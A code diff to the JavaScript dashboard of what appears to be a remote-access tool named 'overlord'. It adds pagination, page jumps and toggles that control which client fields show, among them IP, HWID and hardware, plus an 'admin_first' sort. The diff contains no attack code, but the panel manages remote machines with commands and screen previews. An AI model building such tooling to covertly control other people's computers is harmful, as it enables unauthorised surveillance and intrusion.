@@ -5,6 +5,7 @@ import { openMenu, closeMenu, openModal, wireModalClose, menu } from "./ui.js";
 import {
   registerRenderer,
   loadWithOptions,
+  renderCachedClients,
   startAutoRefresh,
   sendCommand,
   requestPreview,
@@ -16,14 +17,18 @@ import { ThumbnailLoader } from "./thumbnail-loader.js";
 const grid = document.getElementById("grid");
 const totalPill = document.getElementById("total-pill");
 const pageLabel = document.getElementById("page-label");
+const pageTotal = document.getElementById("page-total");
 const prevBtn = document.getElementById("prev");
 const nextBtn = document.getElementById("next");
+const pageJumpForm = document.getElementById("page-jump-form");
+const pageJumpInput = document.getElementById("page-jump-input");
 const searchInput = document.getElementById("search");
 const sortSelect = document.getElementById("sort");
 const filterStatusSelect = document.getElementById("filter-status");
 const filterOsSelect = document.getElementById("filter-os");
 const filterGroupSelect = document.getElementById("filter-group");
 const showOfflineToggle = document.getElementById("toggle-offline");
+const displayFieldsMenu = document.getElementById("display-fields-menu");
 const selectAllBtn = document.getElementById("select-all");
 const clearSelectionBtn = document.getElementById("clear-selection");
 const logoutBtn = document.getElementById("logout-btn");
@@ -50,10 +55,38 @@ const PREF_SORT_KEY = "overlord_sort";
 const PREF_FILTER_OS_KEY = "overlord_filter_os";
 const PREF_FILTER_COUNTRY_KEY = "overlord_filter_country";
 const PREF_FILTER_GROUP_KEY = "overlord_filter_group";
+const PREF_DISPLAY_FIELDS_KEY = "overlord_display_fields";
+const DEFAULT_DISPLAY_FIELDS = {
+  user: true,
+  ip: true,
+  hwid: false,
+  system: true,
+  version: true,
+  monitors: true,
+  group: true,
+  hardware: true,
+  battery: true,
+};
+let displayFields = { ...DEFAULT_DISPLAY_FIELDS };
 
 let currentUser = null;
 let contextCard = null;
 let availableOsList = new Set();
+let rendererInitialized = false;
+let lastKnownTotalPages = 1;
+
+window.setDashboardPageBounds = (currentPage, totalPages) => {
+  lastKnownTotalPages = Math.max(1, Number(totalPages) || 1);
+  const safeCurrentPage = Math.max(1, Number(currentPage) || 1);
+  if (pageLabel) pageLabel.textContent = "Page";
+  if (pageTotal) pageTotal.textContent = String(lastKnownTotalPages);
+  if (!pageJumpInput) return;
+  pageJumpInput.max = String(lastKnownTotalPages);
+  pageJumpInput.style.width = `${Math.min(8, Math.max(2, String(lastKnownTotalPages).length, String(safeCurrentPage).length)) + 2}ch`;
+  if (document.activeElement !== pageJumpInput) {
+    pageJumpInput.value = String(safeCurrentPage);
+  }
+};
 
 function setServerVersionLabel(version) {
   if (!serverVersionText) return;
@@ -667,11 +700,67 @@ function setLayout(layout) {
   applyLayoutToggleUI(next);
   if (rendererSetLayout) rendererSetLayout(next);
   state.lastDigest = "";
-  loadWithOptions({ force: true, reorder: true });
+  if (!renderCachedClients({ reorder: true, force: true })) {
+    loadWithOptions({ force: true, reorder: true });
+  }
 }
 
 document.querySelectorAll("#layout-toggle .layout-toggle-btn").forEach((btn) => {
   btn.addEventListener("click", () => setLayout(btn.dataset.layout));
+});
+
+function loadDisplayFields() {
+  try {
+    const saved = JSON.parse(localStorage.getItem(PREF_DISPLAY_FIELDS_KEY) || "null");
+    if (saved && typeof saved === "object") {
+      displayFields = { ...DEFAULT_DISPLAY_FIELDS, ...saved };
+    }
+  } catch {
+    displayFields = { ...DEFAULT_DISPLAY_FIELDS };
+  }
+}
+
+function syncDisplayFieldInputs() {
+  displayFieldsMenu?.querySelectorAll("input[data-field]").forEach((input) => {
+    input.checked = displayFields[input.dataset.field] !== false;
+  });
+}
+
+function saveDisplayFields() {
+  localStorage.setItem(PREF_DISPLAY_FIELDS_KEY, JSON.stringify(displayFields));
+}
+
+function rerenderDisplayFields() {
+  state.lastDigest = "";
+  if (!renderCachedClients({ reorder: true, force: true })) {
+    loadWithOptions({ force: true, reorder: true });
+  }
+}
+
+loadDisplayFields();
+syncDisplayFieldInputs();
+
+displayFieldsMenu?.addEventListener("change", (e) => {
+  const input = e.target.closest("input[data-field]");
+  if (!input) return;
+  displayFields[input.dataset.field] = input.checked;
+  saveDisplayFields();
+  rerenderDisplayFields();
+});
+
+document.addEventListener("click", (e) => {
+  document.querySelectorAll(".dashboard-menu[open]").forEach((details) => {
+    if (!details.contains(e.target)) details.removeAttribute("open");
+  });
+});
+
+document.querySelectorAll(".dashboard-menu").forEach((details) => {
+  details.addEventListener("toggle", () => {
+    if (!details.open) return;
+    document.querySelectorAll(".dashboard-menu[open]").forEach((other) => {
+      if (other !== details) other.removeAttribute("open");
+    });
+  });
 });
 
 let dashboardThumbnailLoader = null;
@@ -729,6 +818,8 @@ async function setupDashboardThumbnailLoader() {
 }
 
 function initializeRenderer() {
+  if (rendererInitialized) return;
+  rendererInitialized = true;
   const savedLayout = localStorage.getItem(PREF_LAYOUT_KEY) || "rows";
   if (grid) grid.dataset.layout = ["rows", "table", "cards"].includes(savedLayout) ? savedLayout : "rows";
   applyLayoutToggleUI(grid?.dataset.layout || "rows");
@@ -750,6 +841,7 @@ function initializeRenderer() {
     requestThumbnail,
     pingClient: (id) => sendCommand(id, "ping"),
     userRole: currentUser?.role,
+    getDisplayFields: () => displayFields,
   });
   rendererSetLayout = rSetLayout;
   registerRenderer(renderMerge);
@@ -758,7 +850,7 @@ function initializeRenderer() {
   loadWithOptions();
   startAutoRefresh();
 
-  if (typeof anime !== "undefined") {
+  if (typeof anime !== "undefined" && !document.documentElement.classList.contains("large-client-set")) {
     anime
       .timeline({ easing: "easeOutQuad" })
       .add({
@@ -874,7 +966,7 @@ import("./country-picker.js").then(({ initCountryPicker }) => {
   }
 
   const savedSort = localStorage.getItem(PREF_SORT_KEY);
-  const validSorts = ["stable", "last_seen_desc", "host_asc", "ping_asc", "ping_desc", "country_asc", "country_desc", "group_asc", "group_desc"];
+  const validSorts = ["stable", "last_seen_desc", "host_asc", "ping_asc", "ping_desc", "country_asc", "country_desc", "group_asc", "group_desc", "admin_first"];
   if (savedSort && validSorts.includes(savedSort)) {
     state.sort = savedSort;
     if (sortSelect) sortSelect.value = savedSort;
@@ -1444,6 +1536,17 @@ prevBtn?.addEventListener("click", () => {
 
 nextBtn?.addEventListener("click", () => {
   state.page += 1;
+  state.lastDigest = "";
+  loadWithOptions({ force: true, reorder: true });
+});
+
+pageJumpForm?.addEventListener("submit", (e) => {
+  e.preventDefault();
+  const requested = Math.trunc(Number(pageJumpInput?.value || 1));
+  const targetPage = Math.min(lastKnownTotalPages, Math.max(1, Number.isFinite(requested) ? requested : 1));
+  if (pageJumpInput) pageJumpInput.value = String(targetPage);
+  if (targetPage === state.page) return;
+  state.page = targetPage;
   state.lastDigest = "";
   loadWithOptions({ force: true, reorder: true });
 });
